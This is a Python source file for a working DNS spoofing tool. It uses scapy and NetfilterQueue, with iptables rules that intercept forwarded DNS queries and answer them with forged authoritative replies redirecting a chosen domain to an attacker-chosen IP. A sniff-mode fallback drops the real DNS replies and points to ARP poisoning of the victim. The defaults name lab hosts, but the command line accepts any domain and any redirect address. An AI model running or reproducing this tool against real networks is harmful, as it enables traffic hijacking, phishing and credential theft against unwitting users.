import scapy.all as scapy
import os
import sys
import signal
try:
    from netfilterqueue import NetfilterQueue
    HAVE_NFQUEUE = True
except Exception:
    HAVE_NFQUEUE = False

# global variable to track the iptables rule
IPTABLES_RULE_ADDED = False
SNIFF_DROP_RULE_ADDED = False

def add_iptables_rule():
    """
    Adds an iptables rule to send DNS packets to the NFQUEUE.
    This allows us to intercept them in Python, modify them, or drop them.
    """
    global IPTABLES_RULE_ADDED
    print("Adding iptables rule to queue forwarded DNS packets...")
    # -I FORWARD: insert at the top of the FORWARD chain
    # -p udp --dport 53: match UDP packets destined for port 53 (DNS)
    # -j NFQUEUE --queue-num 0: send them to Queue 0
    ret = os.system("iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0 2>/dev/null")
    if ret == 0:
        IPTABLES_RULE_ADDED = True
    else:
        print("WARNING: Failed to insert NFQUEUE iptables rule. NFQUEUE is not supported or iptables interaction failed.")
        raise RuntimeError("NFQUEUE iptables rule insertion failed")

def remove_iptables_rule():
    """
    Removes the iptables rule.
    """
    global IPTABLES_RULE_ADDED
    if IPTABLES_RULE_ADDED:
        print("\nRemoving iptables rule...")
        os.system("iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0")
        IPTABLES_RULE_ADDED = False


def add_sniff_drop_rules():
    """Drop forwarded DNS packets so the real server's replies do not race ours when NFQUEUE is unavailable."""
    global SNIFF_DROP_RULE_ADDED
    print("Adding iptables DROP rules on UDP/53 (FORWARD) to suppress real DNS replies in sniff-mode...")
    ret1 = os.system("iptables -I FORWARD -p udp --dport 53 -j DROP 2>/dev/null")
    ret2 = os.system("iptables -I FORWARD -p udp --sport 53 -j DROP 2>/dev/null")
    if ret1 == 0 and ret2 == 0:
        SNIFF_DROP_RULE_ADDED = True
    else:
        print("WARNING: Failed to add DROP rules for sniff-mode. Legit DNS replies may still win the race.")


def remove_sniff_drop_rules():
    global SNIFF_DROP_RULE_ADDED
    if SNIFF_DROP_RULE_ADDED:
        print("\nRemoving sniff-mode DROP rules on UDP/53...")
        os.system("iptables -D FORWARD -p udp --dport 53 -j DROP 2>/dev/null")
        os.system("iptables -D FORWARD -p udp --sport 53 -j DROP 2>/dev/null")
        SNIFF_DROP_RULE_ADDED = False

def process_packet(packet):
    """
    Callback function for every packet in the NFQUEUE.
    """
    # convert the NetfilterQueue packet to a Scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    
    # check if the packet has a DNS layer and is a Query (qr=0)
    if scapy_packet.haslayer(scapy.DNS) and scapy_packet[scapy.DNS].qr == 0:
        qname = scapy_packet[scapy.DNS].qd.qname.decode()
        
        print(f"Detected DNS Query for: {qname}")
        
        target_domain = globals().get("TARGET_DOMAIN", "web1.mylab.test.")
        
        if target_domain in qname:
            print(f"SUCCESS: Spoofing target: {qname}")
            
            # create a spoofed DNS response
            spoofed_ip = scapy.IP(src=scapy_packet[scapy.IP].dst, dst=scapy_packet[scapy.IP].src)
            spoofed_udp = scapy.UDP(sport=scapy_packet[scapy.UDP].dport, dport=scapy_packet[scapy.UDP].sport)
            
            spoofed_dns = scapy.DNS(
                id=scapy_packet[scapy.DNS].id,
                qr=1,
                aa=1,
                qd=scapy_packet[scapy.DNS].qd,
                an=scapy.DNSRR(rrname=qname, ttl=10, rdata=globals().get("REDIRECT_IP", "10.0.0.3")) # Redirect to REDIRECT_IP
            )
            
            spoofed_packet = spoofed_ip / spoofed_udp / spoofed_dns
            
            # send the new packet manually and drop the original
            scapy.send(spoofed_packet, verbose=False)
            print(f"SUCESS: Sent spoofed response for {qname} -> 10.0.0.3")
            
            # drop the original query so it never reaches the real server
            packet.drop()
            return

    # if it's not a DNS query we care about, let it pass
    packet.accept()


def process_packet_sniff(packet):
    """
    Process incoming DNS queries in sniff mode (when NFQUEUE isn't available).
    """
    if not packet.haslayer(scapy.DNS) or packet[scapy.DNS].qr != 0:
        return

    qname = packet[scapy.DNS].qd.qname.decode()
    src_ip = packet[scapy.IP].src
    dst_ip = packet[scapy.IP].dst
    sport = packet[scapy.UDP].sport
    dport = packet[scapy.UDP].dport
    if packet.haslayer(scapy.Ether):
        l2_src = packet[scapy.Ether].src
        l2_dst = packet[scapy.Ether].dst
    else:
        l2_src = None
        l2_dst = None
    print(f"Detected DNS Query (sniff-mode): {qname} from {src_ip}:{sport} (L2 {l2_src}) -> {dst_ip}:{dport} (L2 {l2_dst})")

    target_domain = globals().get("TARGET_DOMAIN", "web1.mylab.test.")
    if target_domain in qname:
        # Build spoofed reply
        if packet.haslayer(scapy.Ether):
            victim_mac = packet[scapy.Ether].src
            our_mac = scapy.get_if_hwaddr(scapy.conf.iface)
            eth = scapy.Ether(src=our_mac, dst=victim_mac)
        else:
            eth = None

        # the victim believes the DNS server IP is e.g. 10.0.0.2; use that as src
        src_ip = packet[scapy.IP].dst
        dst_ip = packet[scapy.IP].src
        sport = packet[scapy.UDP].dport
        dport = packet[scapy.UDP].sport
        spoofed_ip = scapy.IP(src=src_ip, dst=dst_ip)
        spoofed_udp = scapy.UDP(sport=sport, dport=dport)
        spoofed_dns = scapy.DNS(
            id=packet[scapy.DNS].id,
            qr=1,
            aa=1,
            qd=packet[scapy.DNS].qd,
            an=scapy.DNSRR(rrname=qname, ttl=10, rdata=globals().get("REDIRECT_IP", "10.0.0.3"))
        )
        pkt = spoofed_ip / spoofed_udp / spoofed_dns
        if eth:
            pkt = eth / pkt
            scapy.sendp(pkt, iface=scapy.conf.iface, verbose=False)
        else:
            scapy.send(pkt, verbose=False)
        print(f"SUCCESS: Sent spoofed response for {qname} -> {globals().get('REDIRECT_IP', '10.0.0.3')} (sniff-mode)")

def run_dns_spoof():
    try:
        # first try to add the NFQUEUE iptables rule; if it fails we fall back to sniff mode
        try:
            add_iptables_rule()
        except Exception as e:
            print(f"WARNING: NFQUEUE rule insertion failed: {e}")
            print("Falling back to sniff-mode because NFQUEUE rule failed.")
            # we skip adding the iptables rule and go directly to sniff mode
            add_nfqueue = False
        else:
            add_nfqueue = True
        if HAVE_NFQUEUE and add_nfqueue:
            print("Starting DNS Spoofer (NFQUEUE Mode)...")
            print("Waiting for DNS queries...")
            queue = NetfilterQueue()
            # bind to Queue 0 and use process_packet callback
            queue.bind(0, process_packet)
            queue.run()
        else:
            # no NFQUEUE available: fall back to sniff mode
            print("NFQUEUE not available; falling back to sniff mode.")
            print("NOTE: sniff-mode requires the victim to send DNS queries to the attacker (e.g., via ARP poisoning of the DNS server IP or by setting attacker as gateway).")
            print("Waiting for DNS queries (sniff-mode)...")
            add_sniff_drop_rules()
            iface = scapy.conf.iface
            print(f"Listening on interface: {iface}")
            # ensure handler exists
            prn_func = globals().get('process_packet_sniff')
            if prn_func is None:
                print("ERROR: process_packet_sniff is not defined. Exiting sniff-mode.")
                return
            # sniff UDP packets on port 53 and call a sniff-based handler
            scapy.sniff(filter="udp and port 53", prn=prn_func, store=False, iface=iface)
        
    except KeyboardInterrupt:
        print("\n!!! Detected CTRL+C ...")
    except Exception as e:
        print(f"ERROR: {e}")
    finally:
        remove_iptables_rule()
        remove_sniff_drop_rules()

if __name__ == "__main__":
    # ensure we handle termination signals to clean up iptables
    def _graceful_shutdown(signum, frame):
        try:
            remove_iptables_rule()
        except Exception:
            pass
        sys.exit(0)
    signal.signal(signal.SIGTERM, _graceful_shutdown)
    signal.signal(signal.SIGINT, _graceful_shutdown)
    
    # parse CLI options: domain to spoof and rdata to redirect to
    import argparse
    parser = argparse.ArgumentParser(description="DNS Spoofing tool")
    parser.add_argument("--domain", default="web1.mylab.test.", help="Domain to spoof (include trailing dot)")
    parser.add_argument("--rdata", default=scapy.get_if_addr(scapy.conf.iface), help="IP address to return for the domain (default is this host)")
    parser.add_argument("--iface", default=scapy.conf.iface, help="Network interface to listen on and send replies from (default scapy.conf.iface)")
    args = parser.parse_args()
    target_domain = args.domain
    redirect_ip = args.rdata
    iface = args.iface
    # Set the scapy default iface to the requested one for sending
    scapy.conf.iface = iface
    # Expose these as module globals used in process_packet/process_packet_sniff
    globals()["TARGET_DOMAIN"] = target_domain
    globals()["REDIRECT_IP"] = redirect_ip
    print(f"Will spoof {target_domain} -> {redirect_ip} on iface {iface}")
    run_dns_spoof()
